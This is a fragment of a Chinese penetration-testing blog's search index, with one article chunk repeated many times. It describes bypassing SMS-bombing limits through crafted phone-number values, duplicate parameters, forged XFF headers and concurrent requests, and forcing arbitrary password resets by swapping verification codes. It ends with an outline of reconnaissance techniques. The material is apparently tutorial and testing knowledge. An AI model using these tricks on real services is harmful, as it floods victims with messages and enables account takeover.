次发送短信验证码，验证码都是同一个。这样的情况下，可以试试爆破验证码，如果爆破次数无限制，还是存在验证码固定这样漏洞的 验证码不失效 1比如验证码是在修改密码处使用。在使用短信验证码进入修改密码后，验证码没有失效。当前用户还可以再次用这个短信验证码修改密码 验证码不失效 2场景：收到两条短信验证码，时间顺序为，1 在前，2 在后。收到的 2 后，1 还是没有失效- 验证码绕过技巧项目在上线前，只是写好验证码接口，不会调用短信资源。因而为了功能登录会把验证码设计成固定的比如尝试 6 个 1，6 个 0 短信验证码 验证码技巧在找回密码方面，填写完账号名，要给A发短信验证码，通过burp拦截包，给B发送短信验证码。这样的话，就能用B的验证码提交给A用，造成任意账号密码重置 本文仅用于技术讨论与学习，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者及本公众号不为此承担任何责任。 ","date":"2024-05-20","objectID":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/:2:3","series":null,"tags":["总结","验证码"],"title":"验证码渗透最全总结","uri":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/#短信炸弹的绕过技巧-3--添加多个值"},{"categories":["学习"],"content":" 短信炸弹的绕过技巧我们在了解基础短信验证码的漏洞后，相应的开发也会进行了解。那么我们就需要增加技巧来绕过这些东西。 短信炸弹的绕过技巧 1–特殊字符通常，开发在发送短信验证码的时候，没有对特殊字符进行过滤。比如在手机号是 15312341234。我们加上+86，变成+8615312341234，这样的话服务器就有可能判定为两个手机号了。 在 mobile=15312341234 的前面，加空格，86，086，0086，+86，0，00，/r,/n,?,#,!,,…只要想法多就有可能绕过。 控制phone参数进行攻击 短信炸弹的绕过技巧 2–添加 XFF在请求包中添加XFF头，有的时候服务器是按照IP地址进行判定的。 短信炸弹的绕过技巧 3–添加多个值在发送手机短信验证码的时候可以把一个参数赋上多个值。比如 Mobile=18312341234,13612341234\u0026code=1234 短信炸弹的绕过技巧 4–添加多个参数比如 Mobile=18312341234\u0026Mobile=13612341234 短信炸弹的绕过技巧 5–修改返回包在发送短信验证码的数据包，修改返回包的 Flase 为 Success 短信炸弹的绕过技巧 6–并发对短信验证码的数据包进行并发，有机会绕过限制 在响应包里面可以看到短信验证码在抓取短信验证码的数据包后，在 response 可以看到短信验证码 提交别人的验证码假设有一个需要短信验证码功能点。给自己手机号 13512341234 发送验证码为 111111，给别人手机号 18312341234 收到验证码为 222222。那么自己手机号使用 222222 验证码，也能正常登录 每次短信验证码都是同一个一个手机号，点击 2 次发送短信验证码，验证码都是同一个。这样的情况下，可以试试爆破验证码，如果爆破次数无限制，还是存在验证码固定这样漏洞的 验证码不失效 1比如验证码是在修改密码处使用。在使用短信验证码进入修改密码后，验证码没有失效。当前用户还可以再次用这个短信验证码修改密码 验证码不失效 2场景：收到两条短信验证码，时间顺序为，1 在前，2 在后。收到的 2 后，1 还是没有失效- 验证码绕过技巧项目在上线前，只是写好验证码接口，不会调用短信资源。因而为了功能登录会把验证码设计成固定的比如尝试 6 个 1，6 个 0 短信验证码 验证码技巧在找回密码方面，填写完账号名，要给A发短信验证码，通过burp拦截包，给B发送短信验证码。这样的话，就能用B的验证码提交给A用，造成任意账号密码重置 本文仅用于技术讨论与学习，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者及本公众号不为此承担任何责任。 ","date":"2024-05-20","objectID":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/:2:3","series":null,"tags":["总结","验证码"],"title":"验证码渗透最全总结","uri":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/#短信炸弹的绕过技巧-4--添加多个参数"},{"categories":["学习"],"content":" 短信炸弹的绕过技巧我们在了解基础短信验证码的漏洞后，相应的开发也会进行了解。那么我们就需要增加技巧来绕过这些东西。 短信炸弹的绕过技巧 1–特殊字符通常，开发在发送短信验证码的时候，没有对特殊字符进行过滤。比如在手机号是 15312341234。我们加上+86，变成+8615312341234，这样的话服务器就有可能判定为两个手机号了。 在 mobile=15312341234 的前面，加空格，86，086，0086，+86，0，00，/r,/n,?,#,!,,…只要想法多就有可能绕过。 控制phone参数进行攻击 短信炸弹的绕过技巧 2–添加 XFF在请求包中添加XFF头，有的时候服务器是按照IP地址进行判定的。 短信炸弹的绕过技巧 3–添加多个值在发送手机短信验证码的时候可以把一个参数赋上多个值。比如 Mobile=18312341234,13612341234\u0026code=1234 短信炸弹的绕过技巧 4–添加多个参数比如 Mobile=18312341234\u0026Mobile=13612341234 短信炸弹的绕过技巧 5–修改返回包在发送短信验证码的数据包，修改返回包的 Flase 为 Success 短信炸弹的绕过技巧 6–并发对短信验证码的数据包进行并发，有机会绕过限制 在响应包里面可以看到短信验证码在抓取短信验证码的数据包后，在 response 可以看到短信验证码 提交别人的验证码假设有一个需要短信验证码功能点。给自己手机号 13512341234 发送验证码为 111111，给别人手机号 18312341234 收到验证码为 222222。那么自己手机号使用 222222 验证码，也能正常登录 每次短信验证码都是同一个一个手机号，点击 2 次发送短信验证码，验证码都是同一个。这样的情况下，可以试试爆破验证码，如果爆破次数无限制，还是存在验证码固定这样漏洞的 验证码不失效 1比如验证码是在修改密码处使用。在使用短信验证码进入修改密码后，验证码没有失效。当前用户还可以再次用这个短信验证码修改密码 验证码不失效 2场景：收到两条短信验证码，时间顺序为，1 在前，2 在后。收到的 2 后，1 还是没有失效- 验证码绕过技巧项目在上线前，只是写好验证码接口，不会调用短信资源。因而为了功能登录会把验证码设计成固定的比如尝试 6 个 1，6 个 0 短信验证码 验证码技巧在找回密码方面，填写完账号名，要给A发短信验证码，通过burp拦截包，给B发送短信验证码。这样的话，就能用B的验证码提交给A用，造成任意账号密码重置 本文仅用于技术讨论与学习，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者及本公众号不为此承担任何责任。 ","date":"2024-05-20","objectID":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/:2:3","series":null,"tags":["总结","验证码"],"title":"验证码渗透最全总结","uri":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/#短信炸弹的绕过技巧-5--修改返回包"},{"categories":["学习"],"content":" 短信炸弹的绕过技巧我们在了解基础短信验证码的漏洞后，相应的开发也会进行了解。那么我们就需要增加技巧来绕过这些东西。 短信炸弹的绕过技巧 1–特殊字符通常，开发在发送短信验证码的时候，没有对特殊字符进行过滤。比如在手机号是 15312341234。我们加上+86，变成+8615312341234，这样的话服务器就有可能判定为两个手机号了。 在 mobile=15312341234 的前面，加空格，86，086，0086，+86，0，00，/r,/n,?,#,!,,…只要想法多就有可能绕过。 控制phone参数进行攻击 短信炸弹的绕过技巧 2–添加 XFF在请求包中添加XFF头，有的时候服务器是按照IP地址进行判定的。 短信炸弹的绕过技巧 3–添加多个值在发送手机短信验证码的时候可以把一个参数赋上多个值。比如 Mobile=18312341234,13612341234\u0026code=1234 短信炸弹的绕过技巧 4–添加多个参数比如 Mobile=18312341234\u0026Mobile=13612341234 短信炸弹的绕过技巧 5–修改返回包在发送短信验证码的数据包，修改返回包的 Flase 为 Success 短信炸弹的绕过技巧 6–并发对短信验证码的数据包进行并发，有机会绕过限制 在响应包里面可以看到短信验证码在抓取短信验证码的数据包后，在 response 可以看到短信验证码 提交别人的验证码假设有一个需要短信验证码功能点。给自己手机号 13512341234 发送验证码为 111111，给别人手机号 18312341234 收到验证码为 222222。那么自己手机号使用 222222 验证码，也能正常登录 每次短信验证码都是同一个一个手机号，点击 2 次发送短信验证码，验证码都是同一个。这样的情况下，可以试试爆破验证码，如果爆破次数无限制，还是存在验证码固定这样漏洞的 验证码不失效 1比如验证码是在修改密码处使用。在使用短信验证码进入修改密码后，验证码没有失效。当前用户还可以再次用这个短信验证码修改密码 验证码不失效 2场景：收到两条短信验证码，时间顺序为，1 在前，2 在后。收到的 2 后，1 还是没有失效- 验证码绕过技巧项目在上线前，只是写好验证码接口，不会调用短信资源。因而为了功能登录会把验证码设计成固定的比如尝试 6 个 1，6 个 0 短信验证码 验证码技巧在找回密码方面，填写完账号名，要给A发短信验证码，通过burp拦截包，给B发送短信验证码。这样的话，就能用B的验证码提交给A用，造成任意账号密码重置 本文仅用于技术讨论与学习，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者及本公众号不为此承担任何责任。 ","date":"2024-05-20","objectID":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/:2:3","series":null,"tags":["总结","验证码"],"title":"验证码渗透最全总结","uri":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/#短信炸弹的绕过技巧-6--并发"},{"categories":["学习"],"content":" 短信炸弹的绕过技巧我们在了解基础短信验证码的漏洞后，相应的开发也会进行了解。那么我们就需要增加技巧来绕过这些东西。 短信炸弹的绕过技巧 1–特殊字符通常，开发在发送短信验证码的时候，没有对特殊字符进行过滤。比如在手机号是 15312341234。我们加上+86，变成+8615312341234，这样的话服务器就有可能判定为两个手机号了。 在 mobile=15312341234 的前面，加空格，86，086，0086，+86，0，00，/r,/n,?,#,!,,…只要想法多就有可能绕过。 控制phone参数进行攻击 短信炸弹的绕过技巧 2–添加 XFF在请求包中添加XFF头，有的时候服务器是按照IP地址进行判定的。 短信炸弹的绕过技巧 3–添加多个值在发送手机短信验证码的时候可以把一个参数赋上多个值。比如 Mobile=18312341234,13612341234\u0026code=1234 短信炸弹的绕过技巧 4–添加多个参数比如 Mobile=18312341234\u0026Mobile=13612341234 短信炸弹的绕过技巧 5–修改返回包在发送短信验证码的数据包，修改返回包的 Flase 为 Success 短信炸弹的绕过技巧 6–并发对短信验证码的数据包进行并发，有机会绕过限制 在响应包里面可以看到短信验证码在抓取短信验证码的数据包后，在 response 可以看到短信验证码 提交别人的验证码假设有一个需要短信验证码功能点。给自己手机号 13512341234 发送验证码为 111111，给别人手机号 18312341234 收到验证码为 222222。那么自己手机号使用 222222 验证码，也能正常登录 每次短信验证码都是同一个一个手机号，点击 2 次发送短信验证码，验证码都是同一个。这样的情况下，可以试试爆破验证码，如果爆破次数无限制，还是存在验证码固定这样漏洞的 验证码不失效 1比如验证码是在修改密码处使用。在使用短信验证码进入修改密码后，验证码没有失效。当前用户还可以再次用这个短信验证码修改密码 验证码不失效 2场景：收到两条短信验证码，时间顺序为，1 在前，2 在后。收到的 2 后，1 还是没有失效- 验证码绕过技巧项目在上线前，只是写好验证码接口，不会调用短信资源。因而为了功能登录会把验证码设计成固定的比如尝试 6 个 1，6 个 0 短信验证码 验证码技巧在找回密码方面，填写完账号名，要给A发短信验证码，通过burp拦截包，给B发送短信验证码。这样的话，就能用B的验证码提交给A用，造成任意账号密码重置 本文仅用于技术讨论与学习，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者及本公众号不为此承担任何责任。 ","date":"2024-05-20","objectID":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/:2:3","series":null,"tags":["总结","验证码"],"title":"验证码渗透最全总结","uri":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/#在响应包里面可以看到短信验证码"},{"categories":["学习"],"content":" 短信炸弹的绕过技巧我们在了解基础短信验证码的漏洞后，相应的开发也会进行了解。那么我们就需要增加技巧来绕过这些东西。 短信炸弹的绕过技巧 1–特殊字符通常，开发在发送短信验证码的时候，没有对特殊字符进行过滤。比如在手机号是 15312341234。我们加上+86，变成+8615312341234，这样的话服务器就有可能判定为两个手机号了。 在 mobile=15312341234 的前面，加空格，86，086，0086，+86，0，00，/r,/n,?,#,!,,…只要想法多就有可能绕过。 控制phone参数进行攻击 短信炸弹的绕过技巧 2–添加 XFF在请求包中添加XFF头，有的时候服务器是按照IP地址进行判定的。 短信炸弹的绕过技巧 3–添加多个值在发送手机短信验证码的时候可以把一个参数赋上多个值。比如 Mobile=18312341234,13612341234\u0026code=1234 短信炸弹的绕过技巧 4–添加多个参数比如 Mobile=18312341234\u0026Mobile=13612341234 短信炸弹的绕过技巧 5–修改返回包在发送短信验证码的数据包，修改返回包的 Flase 为 Success 短信炸弹的绕过技巧 6–并发对短信验证码的数据包进行并发，有机会绕过限制 在响应包里面可以看到短信验证码在抓取短信验证码的数据包后，在 response 可以看到短信验证码 提交别人的验证码假设有一个需要短信验证码功能点。给自己手机号 13512341234 发送验证码为 111111，给别人手机号 18312341234 收到验证码为 222222。那么自己手机号使用 222222 验证码，也能正常登录 每次短信验证码都是同一个一个手机号，点击 2 次发送短信验证码，验证码都是同一个。这样的情况下，可以试试爆破验证码，如果爆破次数无限制，还是存在验证码固定这样漏洞的 验证码不失效 1比如验证码是在修改密码处使用。在使用短信验证码进入修改密码后，验证码没有失效。当前用户还可以再次用这个短信验证码修改密码 验证码不失效 2场景：收到两条短信验证码，时间顺序为，1 在前，2 在后。收到的 2 后，1 还是没有失效- 验证码绕过技巧项目在上线前，只是写好验证码接口，不会调用短信资源。因而为了功能登录会把验证码设计成固定的比如尝试 6 个 1，6 个 0 短信验证码 验证码技巧在找回密码方面，填写完账号名，要给A发短信验证码，通过burp拦截包，给B发送短信验证码。这样的话，就能用B的验证码提交给A用，造成任意账号密码重置 本文仅用于技术讨论与学习，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者及本公众号不为此承担任何责任。 ","date":"2024-05-20","objectID":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/:2:3","series":null,"tags":["总结","验证码"],"title":"验证码渗透最全总结","uri":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/#提交别人的验证码"},{"categories":["学习"],"content":" 短信炸弹的绕过技巧我们在了解基础短信验证码的漏洞后，相应的开发也会进行了解。那么我们就需要增加技巧来绕过这些东西。 短信炸弹的绕过技巧 1–特殊字符通常，开发在发送短信验证码的时候，没有对特殊字符进行过滤。比如在手机号是 15312341234。我们加上+86，变成+8615312341234，这样的话服务器就有可能判定为两个手机号了。 在 mobile=15312341234 的前面，加空格，86，086，0086，+86，0，00，/r,/n,?,#,!,,…只要想法多就有可能绕过。 控制phone参数进行攻击 短信炸弹的绕过技巧 2–添加 XFF在请求包中添加XFF头，有的时候服务器是按照IP地址进行判定的。 短信炸弹的绕过技巧 3–添加多个值在发送手机短信验证码的时候可以把一个参数赋上多个值。比如 Mobile=18312341234,13612341234\u0026code=1234 短信炸弹的绕过技巧 4–添加多个参数比如 Mobile=18312341234\u0026Mobile=13612341234 短信炸弹的绕过技巧 5–修改返回包在发送短信验证码的数据包，修改返回包的 Flase 为 Success 短信炸弹的绕过技巧 6–并发对短信验证码的数据包进行并发，有机会绕过限制 在响应包里面可以看到短信验证码在抓取短信验证码的数据包后，在 response 可以看到短信验证码 提交别人的验证码假设有一个需要短信验证码功能点。给自己手机号 13512341234 发送验证码为 111111，给别人手机号 18312341234 收到验证码为 222222。那么自己手机号使用 222222 验证码，也能正常登录 每次短信验证码都是同一个一个手机号，点击 2 次发送短信验证码，验证码都是同一个。这样的情况下，可以试试爆破验证码，如果爆破次数无限制，还是存在验证码固定这样漏洞的 验证码不失效 1比如验证码是在修改密码处使用。在使用短信验证码进入修改密码后，验证码没有失效。当前用户还可以再次用这个短信验证码修改密码 验证码不失效 2场景：收到两条短信验证码，时间顺序为，1 在前，2 在后。收到的 2 后，1 还是没有失效- 验证码绕过技巧项目在上线前，只是写好验证码接口，不会调用短信资源。因而为了功能登录会把验证码设计成固定的比如尝试 6 个 1，6 个 0 短信验证码 验证码技巧在找回密码方面，填写完账号名，要给A发短信验证码，通过burp拦截包，给B发送短信验证码。这样的话，就能用B的验证码提交给A用，造成任意账号密码重置 本文仅用于技术讨论与学习，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者及本公众号不为此承担任何责任。 ","date":"2024-05-20","objectID":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/:2:3","series":null,"tags":["总结","验证码"],"title":"验证码渗透最全总结","uri":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/#每次短信验证码都是同一个"},{"categories":["学习"],"content":" 短信炸弹的绕过技巧我们在了解基础短信验证码的漏洞后，相应的开发也会进行了解。那么我们就需要增加技巧来绕过这些东西。 短信炸弹的绕过技巧 1–特殊字符通常，开发在发送短信验证码的时候，没有对特殊字符进行过滤。比如在手机号是 15312341234。我们加上+86，变成+8615312341234，这样的话服务器就有可能判定为两个手机号了。 在 mobile=15312341234 的前面，加空格，86，086，0086，+86，0，00，/r,/n,?,#,!,,…只要想法多就有可能绕过。 控制phone参数进行攻击 短信炸弹的绕过技巧 2–添加 XFF在请求包中添加XFF头，有的时候服务器是按照IP地址进行判定的。 短信炸弹的绕过技巧 3–添加多个值在发送手机短信验证码的时候可以把一个参数赋上多个值。比如 Mobile=18312341234,13612341234\u0026code=1234 短信炸弹的绕过技巧 4–添加多个参数比如 Mobile=18312341234\u0026Mobile=13612341234 短信炸弹的绕过技巧 5–修改返回包在发送短信验证码的数据包，修改返回包的 Flase 为 Success 短信炸弹的绕过技巧 6–并发对短信验证码的数据包进行并发，有机会绕过限制 在响应包里面可以看到短信验证码在抓取短信验证码的数据包后，在 response 可以看到短信验证码 提交别人的验证码假设有一个需要短信验证码功能点。给自己手机号 13512341234 发送验证码为 111111，给别人手机号 18312341234 收到验证码为 222222。那么自己手机号使用 222222 验证码，也能正常登录 每次短信验证码都是同一个一个手机号，点击 2 次发送短信验证码，验证码都是同一个。这样的情况下，可以试试爆破验证码，如果爆破次数无限制，还是存在验证码固定这样漏洞的 验证码不失效 1比如验证码是在修改密码处使用。在使用短信验证码进入修改密码后，验证码没有失效。当前用户还可以再次用这个短信验证码修改密码 验证码不失效 2场景：收到两条短信验证码，时间顺序为，1 在前，2 在后。收到的 2 后，1 还是没有失效- 验证码绕过技巧项目在上线前，只是写好验证码接口，不会调用短信资源。因而为了功能登录会把验证码设计成固定的比如尝试 6 个 1，6 个 0 短信验证码 验证码技巧在找回密码方面，填写完账号名，要给A发短信验证码，通过burp拦截包，给B发送短信验证码。这样的话，就能用B的验证码提交给A用，造成任意账号密码重置 本文仅用于技术讨论与学习，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者及本公众号不为此承担任何责任。 ","date":"2024-05-20","objectID":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/:2:3","series":null,"tags":["总结","验证码"],"title":"验证码渗透最全总结","uri":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/#验证码不失效-1"},{"categories":["学习"],"content":" 短信炸弹的绕过技巧我们在了解基础短信验证码的漏洞后，相应的开发也会进行了解。那么我们就需要增加技巧来绕过这些东西。 短信炸弹的绕过技巧 1–特殊字符通常，开发在发送短信验证码的时候，没有对特殊字符进行过滤。比如在手机号是 15312341234。我们加上+86，变成+8615312341234，这样的话服务器就有可能判定为两个手机号了。 在 mobile=15312341234 的前面，加空格，86，086，0086，+86，0，00，/r,/n,?,#,!,,…只要想法多就有可能绕过。 控制phone参数进行攻击 短信炸弹的绕过技巧 2–添加 XFF在请求包中添加XFF头，有的时候服务器是按照IP地址进行判定的。 短信炸弹的绕过技巧 3–添加多个值在发送手机短信验证码的时候可以把一个参数赋上多个值。比如 Mobile=18312341234,13612341234\u0026code=1234 短信炸弹的绕过技巧 4–添加多个参数比如 Mobile=18312341234\u0026Mobile=13612341234 短信炸弹的绕过技巧 5–修改返回包在发送短信验证码的数据包，修改返回包的 Flase 为 Success 短信炸弹的绕过技巧 6–并发对短信验证码的数据包进行并发，有机会绕过限制 在响应包里面可以看到短信验证码在抓取短信验证码的数据包后，在 response 可以看到短信验证码 提交别人的验证码假设有一个需要短信验证码功能点。给自己手机号 13512341234 发送验证码为 111111，给别人手机号 18312341234 收到验证码为 222222。那么自己手机号使用 222222 验证码，也能正常登录 每次短信验证码都是同一个一个手机号，点击 2 次发送短信验证码，验证码都是同一个。这样的情况下，可以试试爆破验证码，如果爆破次数无限制，还是存在验证码固定这样漏洞的 验证码不失效 1比如验证码是在修改密码处使用。在使用短信验证码进入修改密码后，验证码没有失效。当前用户还可以再次用这个短信验证码修改密码 验证码不失效 2场景：收到两条短信验证码，时间顺序为，1 在前，2 在后。收到的 2 后，1 还是没有失效- 验证码绕过技巧项目在上线前，只是写好验证码接口，不会调用短信资源。因而为了功能登录会把验证码设计成固定的比如尝试 6 个 1，6 个 0 短信验证码 验证码技巧在找回密码方面，填写完账号名，要给A发短信验证码，通过burp拦截包，给B发送短信验证码。这样的话，就能用B的验证码提交给A用，造成任意账号密码重置 本文仅用于技术讨论与学习，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者及本公众号不为此承担任何责任。 ","date":"2024-05-20","objectID":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/:2:3","series":null,"tags":["总结","验证码"],"title":"验证码渗透最全总结","uri":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/#验证码不失效-2"},{"categories":["学习"],"content":" 短信炸弹的绕过技巧我们在了解基础短信验证码的漏洞后，相应的开发也会进行了解。那么我们就需要增加技巧来绕过这些东西。 短信炸弹的绕过技巧 1–特殊字符通常，开发在发送短信验证码的时候，没有对特殊字符进行过滤。比如在手机号是 15312341234。我们加上+86，变成+8615312341234，这样的话服务器就有可能判定为两个手机号了。 在 mobile=15312341234 的前面，加空格，86，086，0086，+86，0，00，/r,/n,?,#,!,,…只要想法多就有可能绕过。 控制phone参数进行攻击 短信炸弹的绕过技巧 2–添加 XFF在请求包中添加XFF头，有的时候服务器是按照IP地址进行判定的。 短信炸弹的绕过技巧 3–添加多个值在发送手机短信验证码的时候可以把一个参数赋上多个值。比如 Mobile=18312341234,13612341234\u0026code=1234 短信炸弹的绕过技巧 4–添加多个参数比如 Mobile=18312341234\u0026Mobile=13612341234 短信炸弹的绕过技巧 5–修改返回包在发送短信验证码的数据包，修改返回包的 Flase 为 Success 短信炸弹的绕过技巧 6–并发对短信验证码的数据包进行并发，有机会绕过限制 在响应包里面可以看到短信验证码在抓取短信验证码的数据包后，在 response 可以看到短信验证码 提交别人的验证码假设有一个需要短信验证码功能点。给自己手机号 13512341234 发送验证码为 111111，给别人手机号 18312341234 收到验证码为 222222。那么自己手机号使用 222222 验证码，也能正常登录 每次短信验证码都是同一个一个手机号，点击 2 次发送短信验证码，验证码都是同一个。这样的情况下，可以试试爆破验证码，如果爆破次数无限制，还是存在验证码固定这样漏洞的 验证码不失效 1比如验证码是在修改密码处使用。在使用短信验证码进入修改密码后，验证码没有失效。当前用户还可以再次用这个短信验证码修改密码 验证码不失效 2场景：收到两条短信验证码，时间顺序为，1 在前，2 在后。收到的 2 后，1 还是没有失效- 验证码绕过技巧项目在上线前，只是写好验证码接口，不会调用短信资源。因而为了功能登录会把验证码设计成固定的比如尝试 6 个 1，6 个 0 短信验证码 验证码技巧在找回密码方面，填写完账号名，要给A发短信验证码，通过burp拦截包，给B发送短信验证码。这样的话，就能用B的验证码提交给A用，造成任意账号密码重置 本文仅用于技术讨论与学习，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者及本公众号不为此承担任何责任。 ","date":"2024-05-20","objectID":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/:2:3","series":null,"tags":["总结","验证码"],"title":"验证码渗透最全总结","uri":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/#验证码绕过技巧"},{"categories":["学习"],"content":" 短信炸弹的绕过技巧我们在了解基础短信验证码的漏洞后，相应的开发也会进行了解。那么我们就需要增加技巧来绕过这些东西。 短信炸弹的绕过技巧 1–特殊字符通常，开发在发送短信验证码的时候，没有对特殊字符进行过滤。比如在手机号是 15312341234。我们加上+86，变成+8615312341234，这样的话服务器就有可能判定为两个手机号了。 在 mobile=15312341234 的前面，加空格，86，086，0086，+86，0，00，/r,/n,?,#,!,,…只要想法多就有可能绕过。 控制phone参数进行攻击 短信炸弹的绕过技巧 2–添加 XFF在请求包中添加XFF头，有的时候服务器是按照IP地址进行判定的。 短信炸弹的绕过技巧 3–添加多个值在发送手机短信验证码的时候可以把一个参数赋上多个值。比如 Mobile=18312341234,13612341234\u0026code=1234 短信炸弹的绕过技巧 4–添加多个参数比如 Mobile=18312341234\u0026Mobile=13612341234 短信炸弹的绕过技巧 5–修改返回包在发送短信验证码的数据包，修改返回包的 Flase 为 Success 短信炸弹的绕过技巧 6–并发对短信验证码的数据包进行并发，有机会绕过限制 在响应包里面可以看到短信验证码在抓取短信验证码的数据包后，在 response 可以看到短信验证码 提交别人的验证码假设有一个需要短信验证码功能点。给自己手机号 13512341234 发送验证码为 111111，给别人手机号 18312341234 收到验证码为 222222。那么自己手机号使用 222222 验证码，也能正常登录 每次短信验证码都是同一个一个手机号，点击 2 次发送短信验证码，验证码都是同一个。这样的情况下，可以试试爆破验证码，如果爆破次数无限制，还是存在验证码固定这样漏洞的 验证码不失效 1比如验证码是在修改密码处使用。在使用短信验证码进入修改密码后，验证码没有失效。当前用户还可以再次用这个短信验证码修改密码 验证码不失效 2场景：收到两条短信验证码，时间顺序为，1 在前，2 在后。收到的 2 后，1 还是没有失效- 验证码绕过技巧项目在上线前，只是写好验证码接口，不会调用短信资源。因而为了功能登录会把验证码设计成固定的比如尝试 6 个 1，6 个 0 短信验证码 验证码技巧在找回密码方面，填写完账号名，要给A发短信验证码，通过burp拦截包，给B发送短信验证码。这样的话，就能用B的验证码提交给A用，造成任意账号密码重置 本文仅用于技术讨论与学习，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者及本公众号不为此承担任何责任。 ","date":"2024-05-20","objectID":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/:2:3","series":null,"tags":["总结","验证码"],"title":"验证码渗透最全总结","uri":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/#验证码技巧"},{"categories":["学习"],"content":" 转载自： https://forum.butian.net/share/2841 万字吐血总结信息收集 一、信息收集前言 二、域名信息 1、Whois查询 1.1、站长之家 1.2、爱站 1.3、微步 1.4、国外的who.is 1.5、阿里云域名信息查询 1.6、腾讯查询 1.7、中国互联网信息中心 2、ICP(Internet Content Provider)备案查询 2.1、国家企业信用信息公示系统 2.2、ICP备案查询网 2.3、ICP备案查询 - 站长工具 2.4、天眼查 2.5、企查查 3、SEO(Search Engine Optimization)查询 3.1、爱站-SEO综合查询 3.2、站长-SEO综合查询 4、历史漏洞 4.1、乌云漏洞库 5、Google Hacking 5.1、intext:后台管理 5.2、intitle：管理登录 5.3、filetype:pdf 5.4、inurl: php?id= 5.5、site：baidu.com 5.6、filetype：pdf site:baidu.com 6、Github 7、维基和百度百科 8、网络空间搜索引擎 8.1、Fofa 8.2、Shodan 8.3、Zoomeye(钟馗之眼) 8.4、Spyse 8.5、Censys 9、REG007 二、APP、小程序、公众号信息收集 1、APP信息搜集 1.1、七麦数据 1.2、AppStore(安卓和IOS) 2、微信公众号和小程序 4、logo 5、favicon.ico 三、子域名收集(挖掘) 1、SSL(HTTPS)证书 1.1、大厂商SSL证书一证多用 1.2、HTTPS证书错误泄露域名 1.3、在线网站证书查询 2、网络深度爬虫 3、域传送漏洞 3.1、常用DNS记录 3.2、DNS区域传送 3.3、域传送漏洞 3.4、检测 4、在线DNS数据 4.1、VirusTotal 4.2、DNSdumpster 4.2、dnsdb 5、自身泄漏 6、Github泄露 7、Google Hacking 8、在线子域名查询 9、子域名枚举爆破 9.1、OneForAll 9.2、subDomainBrute 9.3、Layer 9.4、FuzSub 9.5、Fierce 9.6、御剑 9.7、wydomain 9.8、orangescan 9.9、DNSRecon 9.10、K8 四、IP信息收集 1、CDN概念 2、判断是否真实IP 2.1、nslookup 2.2、多地ping 2.3、IP反查 3、绕CDN找真实IP 3.1、子域名 3.2、历史DNS解析记录 3.3、邮件服务器 3.4、信息泄漏 3.5、网络空间搜索引擎 3.6、利用SSL证书查询 3.7、国外访问 